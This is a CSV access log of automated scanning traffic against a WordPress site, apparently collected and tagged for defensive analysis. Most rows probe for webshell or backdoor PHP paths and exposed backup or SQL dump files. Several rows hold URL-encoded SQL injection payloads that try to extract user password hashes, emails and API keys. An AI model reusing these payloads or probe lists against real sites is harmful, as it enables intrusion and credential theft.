"ip","time","path","useragent","source"
"172.71.82.94","2026-08-03T02:08:40Z","/wp-content/plugins/index.php","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36","plugin_php"
"172.68.164.8","2026-08-03T02:08:44Z","/wp-content/plugins/admin.php","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36","plugin_php"
"172.70.189.157","2026-08-03T02:10:13Z","/wp-content/plugins/hellopress/wp_filemanager.php","-","plugin_php"
"172.69.176.9","2026-08-03T02:32:59Z","/wp-content/plugins/hellopress/wp_filemanager.php","-","plugin_php"
"162.158.170.19","2026-08-03T02:48:57Z","/wp-content/plugins/fix/up.php","Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36","plugin_php"
"108.162.227.143","2026-08-03T02:48:59Z","/wp-content/plugins/pwnd/pwnd.php","Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36","plugin_php"
"162.158.107.64","2026-08-03T02:48:59Z","/wp-content/plugins/pwnd-1/pwnd.php","Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36","plugin_php"
"172.71.81.140","2026-08-03T02:49:02Z","/wp-content/plugins/index.php","Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36","plugin_php"
"104.22.66.85","2026-08-03T02:52:38Z","/wp-content/plugins/fix/up.php","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36","plugin_php"
"104.22.66.85","2026-08-03T02:52:39Z","/wp-content/plugins/apikey/apikey.php?test=hello","Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36","plugin_php"
"162.158.162.122","2026-08-03T03:14:22Z","/wp-content/plugins/","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36","plugin_php"
"172.70.93.71","2026-08-03T03:19:10Z","/wp-content/plugins/hellopress/wp_filemanager.php","-","plugin_php"
"108.162.227.53","2026-08-03T03:24:19Z","/wp-content/plugins/fix/up.php","Mozilla/5.0","plugin_php"
"162.158.107.64","2026-08-03T03:59:17Z","/wp-content/plugins/admin.php","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36","plugin_php"
"162.158.162.130","2026-08-03T03:59:26Z","/wp-content/plugins/admin.php","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36","plugin_php"
"172.70.93.35","2026-08-03T04:16:42Z","/wp-content/plugins/hellopress/wp_filemanager.php","-","plugin_php"
"172.70.189.158","2026-08-03T04:44:15Z","/wp-content/plugins/fix/up.php","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36","plugin_php"
"162.158.170.222","2026-08-03T04:44:15Z","/wp-content/plugins/apikey/apikey.php?test=hello","Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36","plugin_php"
"162.158.108.12","2026-08-03T04:47:20Z","/wp-content/plugins/hellopress/wp_filemanager.php","-","plugin_php"
"172.71.124.40","2026-08-03T04:57:15Z","/wp-content/plugins/","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36","plugin_php"
"162.158.107.69","2026-08-03T05:58:18Z","/wp-content/plugins/hellopress/wp_filemanager.php","-","plugin_php"
"172.70.93.53","2026-08-03T06:10:24Z","/wp-content/plugins/hellopress/wp_filemanager.php","-","plugin_php"
"162.158.170.19","2026-08-03T06:27:03Z","/wp-content/plugins/admin.php","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36","plugin_php"
"162.158.162.122","2026-08-03T07:03:53Z","/wp-content/plugins/hellopress/wp_filemanager.php","-","plugin_php"
"172.70.143.202","2026-08-03T07:04:04Z","/wp-content/plugins/hellopress/wp_filemanager.php","-","plugin_php"
"172.71.82.94","2026-08-03T07:21:24Z","/wp-content/plugins/fix/up.php","Mozilla/5.0","plugin_php"
"172.71.124.40","2026-08-03T07:21:35Z","/wp-content/plugins/fix/up.php","Mozilla/5.0","plugin_php"
"104.23.175.92","2026-08-03T08:22:37Z","/wp-content/plugins/hellopress/wp_filemanager.php","-","plugin_php"
"162.158.163.179","2026-08-02T10:12:45Z","/wp-content/plugins/hellopress/wp_filemanager.php","-","plugin_php"
"162.158.170.199","2026-08-02T10:23:26Z","/wp-content/plugins/index.php","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36","plugin_php"
"108.162.226.191","2026-08-02T10:45:11Z","/wp-content/plugins/hellopress/wp_filemanager.php","-","plugin_php"
"162.158.88.144","2026-08-02T10:51:16Z","/wp-content/plugins/hellopress/wp_filemanager.php","-","plugin_php"
"162.158.108.12","2026-08-02T11:01:56Z","/wp-content/plugins/hellopress/wp_filemanager.php","-","plugin_php"
"162.158.162.123","2026-08-02T11:51:18Z","/wp-content/plugins/","-","plugin_php"
"172.70.188.54","2026-08-02T12:09:22Z","/wp-content/plugins/hellopress/wp_filemanager.php","-","plugin_php"
"104.23.175.180","2026-08-02T12:35:15Z","/wp-content/plugins/hellopress/wp_filemanager.php","-","plugin_php"
"172.71.81.139","2026-08-02T13:02:20Z","/wp-content/plugins/hellopress/wp_filemanager.php","-","plugin_php"
"162.158.170.18","2026-08-02T13:06:18Z","/wp-content/plugins/hellopress/wp_filemanager.php","-","plugin_php"
"172.71.82.129","2026-08-02T13:14:59Z","/wp-content/plugins/hellopress/wp_filemanager.php","-","plugin_php"
"104.22.66.84","2026-08-02T13:15:30Z","/wp-content/plugins/hellopress/wp_filemanager.php","-","plugin_php"
"172.70.208.171","2026-08-02T13:25:17Z","/wp-content/plugins/hellopress/wp_filemanager.php","-","plugin_php"
"162.158.88.76","2026-08-02T13:30:04Z","/wp-content/plugins/hellopress/wp_filemanager.php","-","plugin_php"
"172.70.142.133","2026-08-02T13:30:24Z","//wp-content/plugins/Core-EconX/up.php","-","plugin_php"
"172.70.142.133","2026-08-02T13:30:47Z","//wp-content/plugins/achdxhv/languages/admin.php","-","plugin_php"
"172.71.124.29","2026-08-02T13:31:54Z","/wp-content/plugins/hellopress/wp_filemanager.php","-","plugin_php"
"104.23.175.147","2026-08-02T13:36:56Z","/wp-content/plugins/fix/up.php","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36","plugin_php"
"162.158.170.223","2026-08-02T13:36:56Z","/wp-content/plugins/apikey/apikey.php?test=hello","Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36","plugin_php"
"172.70.93.52","2026-08-02T13:50:02Z","/wp-content/plugins/hellopress/wp_filemanager.php","-","plugin_php"
"172.70.189.28","2026-08-02T13:50:21Z","/wp-content/plugins/hellopress/wp_filemanager.php","-","plugin_php"
"162.158.88.68","2026-08-02T14:17:17Z","/wp-content/plugins/hellopress/wp_filemanager.php","-","plugin_php"
"162.158.88.144","2026-08-02T14:18:32Z","/wp-content/plugins/hellopress/wp_filemanager.php","-","plugin_php"
"104.23.175.163","2026-08-02T14:18:45Z","//wp-content/plugins/Core-EconX/up.php","-","plugin_php"
"162.158.108.157","2026-08-02T14:19:25Z","//wp-content/plugins/achdxhv/languages/admin.php","-","plugin_php"
"172.68.164.102","2026-08-02T14:21:21Z","/wp-content/plugins/index.php","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36","plugin_php"
"162.158.88.145","2026-08-02T15:12:45Z","/wp-content/plugins/hellopress/wp_filemanager.php","-","plugin_php"
"162.158.162.131","2026-08-02T15:59:42Z","/wp-content/plugins/admin.php","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36","plugin_php"
"104.23.175.162","2026-08-02T15:59:51Z","/wp-content/plugins/admin.php","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36","plugin_php"
"162.158.88.170","2026-08-02T16:52:47Z","/wp-content/plugins/hellopress/wp_filemanager.php","-","plugin_php"
"172.68.164.74","2026-08-02T17:04:58Z","/wp-content/plugins/revslider/includes/external/page/index.php","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36","plugin_php"
"162.158.108.33","2026-08-02T17:05:04Z","/wp-content/plugins/pwnd/1.php","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36","plugin_php"
"162.158.106.232","2026-08-02T17:05:08Z","/wp-content/plugins/admin.php","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36","plugin_php"
"172.70.189.157","2026-08-02T17:05:18Z","/wp-content/plugins/simple/simple.php","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36","plugin_php"
"172.71.124.18","2026-08-02T17:05:24Z","/wp-content/plugins/linkpreview/index.php/class.php","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36","plugin_php"
"172.69.165.63","2026-08-02T17:05:30Z","/wp-content/plugins/WordPressCore/include.php","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36","plugin_php"
"162.158.189.190","2026-08-02T17:27:34Z","/wp-content/plugins/hellopress/wp_filemanager.php","-","plugin_php"
"162.158.88.76","2026-08-02T17:54:18Z","/wp-content/plugins/hellopress/wp_filemanager.php","-","plugin_php"
"104.23.175.92","2026-08-02T17:56:42Z","/wp-content/plugins/hellopress/wp_filemanager.php","-","plugin_php"
"162.158.108.33","2026-08-02T17:57:29Z","/wp-content/plugins/hellopress/wp_filemanager.php","-","plugin_php"
"162.158.88.69","2026-08-02T17:57:33Z","//wp-content/plugins/Core-EconX/up.php","-","plugin_php"
"172.69.166.59","2026-08-02T17:58:15Z","//wp-content/plugins/achdxhv/languages/admin.php","-","plugin_php"
"172.70.189.28","2026-08-02T18:00:36Z","/wp-content/plugins/hellopress/wp_filemanager.php","-","plugin_php"
"162.158.88.171","2026-08-02T18:16:04Z","/wp-content/plugins/fix/up.php","Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36","plugin_php"
"172.68.164.8","2026-08-02T18:16:05Z","/wp-content/plugins/pwnd/pwnd.php","Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36","plugin_php"
"162.158.88.171","2026-08-02T18:16:06Z","/wp-content/plugins/pwnd-1/pwnd.php","Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36","plugin_php"
"104.22.176.21","2026-08-02T18:16:10Z","/wp-content/plugins/index.php","Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36","plugin_php"
"172.70.208.157","2026-08-02T18:29:43Z","/wp-content/plugins/hellopress/wp_mna.php","Go-http-client/2.0","plugin_php"
"104.22.66.152","2026-08-02T18:29:46Z","/wp-content/plugins/index.php","Go-http-client/2.0","plugin_php"
"172.69.176.55","2026-08-02T18:37:08Z","/wp-content/plugins/hellopress/wp_filemanager.php","-","plugin_php"
"172.68.242.48","2026-08-02T18:45:33Z","/wp-content/plugins/hellopress/wp_filemanager.php","-","plugin_php"
"172.70.208.32","2026-08-02T18:45:54Z","/wp-content/plugins/hellopress/wp_filemanager.php","-","plugin_php"
"162.158.163.180","2026-08-02T19:57:56Z","/wp-content/plugins/hellopress/wp_filemanager.php","-","plugin_php"
"172.71.124.185","2026-08-02T20:25:47Z","/wp-content/plugins/fix/up.php","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36","plugin_php"
"162.158.170.222","2026-08-02T20:25:51Z","/wp-content/plugins/apikey/apikey.php?test=hello","Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36","plugin_php"
"172.71.124.185","2026-08-02T20:32:01Z","/wp-content/plugins/hellopress/wp_filemanager.php","-","plugin_php"
"172.68.164.55","2026-08-02T20:48:36Z","/wp-content/plugins/core-plugin/include.php","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36","plugin_php"
"172.71.81.110","2026-08-02T20:48:46Z","/wp-content/plugins/linkpreview/index.php","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36","plugin_php"
"172.70.189.74","2026-08-02T20:48:55Z","/wp-content/plugins/dummyyummy/wp-signup.php","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36","plugin_php"
"162.158.108.157","2026-08-02T21:19:01Z","/wp-content/plugins/core-plugin/include.php","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36","plugin_php"
"172.68.164.102","2026-08-02T21:19:10Z","/wp-content/plugins/linkpreview/index.php","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36","plugin_php"
"172.70.142.9","2026-08-02T21:19:15Z","/wp-content/plugins/dummyyummy/wp-signup.php","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36","plugin_php"
"172.68.164.9","2026-08-02T21:28:25Z","/wp-content/plugins/core-plugin/include.php","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36","plugin_php"
"108.162.226.106","2026-08-02T21:28:40Z","/wp-content/plugins/linkpreview/index.php","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36","plugin_php"
"104.23.175.181","2026-08-02T21:28:45Z","/wp-content/plugins/dummyyummy/wp-signup.php","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36","plugin_php"
"172.70.189.28","2026-08-02T22:58:13Z","/wp-content/plugins/hellopress/wp_filemanager.php","-","plugin_php"
"172.71.124.40","2026-08-02T23:41:24Z","/wp-content/plugins/ultra/admin/options.php?action=edit&id=1%27+UNION+SELECT+user_login%2Cuser_pass%2Cuser_email+FROM+wp_users--+-","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36","plugin_php"
"172.69.176.9","2026-08-02T23:41:27Z","/wp-content/plugins/ultra/admin/options.php?action=edit&id=1%27+UNION+SELECT+option_name%2Coption_value%2Cautoload+FROM+wp_options+WHERE+option_name+LIKE+%27%25key%25%27--+-","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36","plugin_php"
"162.158.108.170","2026-08-02T23:41:34Z","/wp-content/plugins/ultra/admin/options.php?action=edit&id=1%27+UNION+SELECT+meta_key%2Cmeta_value%2Cuser_id+FROM+wp_usermeta+WHERE+meta_key+LIKE+%27%25api%25%27--+-","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36","plugin_php"
"162.158.162.122","2026-08-02T23:42:00Z","/wp-content/plugins/ultra/includes/ajax.php?action=get_option&id=1%27+UNION+SELECT+user_login%2Cuser_pass%2Cuser_email+FROM+wp_users--+-","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36","plugin_php"
"108.162.226.106","2026-08-02T23:42:03Z","/wp-content/plugins/ultra/includes/ajax.php?action=get_option&id=1%27+UNION+SELECT+option_name%2Coption_value%2Cautoload+FROM+wp_options+WHERE+option_name+LIKE+%27%25key%25%27--+-","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36","plugin_php"
"162.158.106.48","2026-08-02T23:42:12Z","/wp-content/plugins/ultra/includes/ajax.php?action=get_option&id=1%27+UNION+SELECT+meta_key%2Cmeta_value%2Cuser_id+FROM+wp_usermeta+WHERE+meta_key+LIKE+%27%25api%25%27--+-","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36","plugin_php"
"172.70.93.4","2026-08-02T23:56:58Z","/wp-content/plugins/admin.php","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36","plugin_php"
"162.158.162.126","2026-08-02T23:57:11Z","/wp-content/plugins/admin.php","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36","plugin_php"
"172.69.176.136","2026-08-03T04:42:12Z","/backup.zip","Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0","sql_conf_zip"
"104.22.66.84","2026-08-03T04:42:14Z","/harianbisnis.zip","Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0","sql_conf_zip"
"162.158.108.83","2026-08-03T04:42:16Z","/laravel.zip","Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0","sql_conf_zip"
"172.68.164.134","2026-08-03T04:42:20Z","/lara.zip","Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0","sql_conf_zip"
"104.23.175.146","2026-08-03T04:42:24Z","/wp-backup.zip","Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0","sql_conf_zip"
"162.158.163.179","2026-08-03T04:42:25Z","/api.zip","Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0","sql_conf_zip"
"162.158.170.23","2026-08-03T06:13:22Z","/backup.zip","Go-http-client/1.1","sql_conf_zip"
"172.71.124.98","2026-08-03T06:13:23Z","/dump.sql","Go-http-client/1.1","sql_conf_zip"
"162.158.108.84","2026-08-03T06:13:23Z","/backup.sql","Go-http-client/1.1","sql_conf_zip"
"172.70.189.110","2026-08-03T06:13:23Z","/database.sql","Go-http-client/1.1","sql_conf_zip"
"162.158.88.140","2026-08-03T06:13:23Z","/database_backup.sql","Go-http-client/1.1","sql_conf_zip"
"172.70.189.87","2026-08-02T13:35:39Z","/backup.zip","Go-http-client/1.1","sql_conf_zip"
"162.158.189.146","2026-08-02T13:35:40Z","/backup.sql","Go-http-client/1.1","sql_conf_zip"
"162.158.108.89","2026-08-02T13:35:40Z","/dump.sql","Go-http-client/1.1","sql_conf_zip"
"172.69.176.111","2026-08-02T13:35:41Z","/database_backup.sql","Go-http-client/1.1","sql_conf_zip"
"108.162.226.83","2026-08-02T13:35:41Z","/database.sql","Go-http-client/1.1","sql_conf_zip"
"162.158.88.79","2026-08-02T22:38:05Z","/backup.zip","Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0","sql_conf_zip"
"172.70.189.67","2026-08-02T22:38:08Z","/inggris-indonesia.zip","Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0","sql_conf_zip"
"162.158.189.80","2026-08-02T22:38:13Z","/laravel.zip","Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0","sql_conf_zip"
"162.158.108.121","2026-08-02T22:38:15Z","/lara.zip","Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0","sql_conf_zip"
"172.70.208.159","2026-08-02T22:38:17Z","/wp-backup.zip","Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0","sql_conf_zip"
"162.158.108.161","2026-08-02T22:38:20Z","/api.zip","Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0","sql_conf_zip"
"162.158.107.42","2026-08-02T22:50:39Z","/dump.sql","Mozilla/5.0 (compatible; DeepSeekBot/1.0; +https://www.deepseek.com/bot)","sql_conf_zip"
"162.158.162.127","2026-08-03T01:28:32Z","/wp-content/themes/about.php","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36","themes_php"
"104.22.66.63","2026-08-03T01:28:35Z","/wp-content/themes/pridmag/il.php","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36","themes_php"
"172.70.93.35","2026-08-03T01:58:34Z","/wp-content/themes/","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36","themes_php"
"172.70.189.58","2026-08-03T02:01:24Z","/wp-content/themes/about.php","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36","themes_php"
"162.158.88.144","2026-08-03T02:01:28Z","/wp-content/themes/pridmag/il.php","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36","themes_php"
"104.22.176.21","2026-08-03T02:08:13Z","/wp-content/themes/about.php","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36","themes_php"
"162.158.162.122","2026-08-03T02:08:17Z","/wp-content/themes/pridmag/il.php","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36","themes_php"
"104.23.175.163","2026-08-03T02:49:00Z","/wp-content/themes/twentynineteen/404.php","Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36","themes_php"
"162.158.107.64","2026-08-03T02:49:01Z","/wp-content/themes/twentytwentyone/404.php","Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36","themes_php"
"162.158.170.19","2026-08-03T02:49:02Z","/wp-content/themes/index.php","Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36","themes_php"
"162.158.170.19","2026-08-03T02:49:04Z","/wp-content/themes/Divi/404.php","Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36","themes_php"
"172.70.92.181","2026-08-03T02:52:38Z","/wp-content/themes/seotheme/db.php?u","Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36","themes_php"
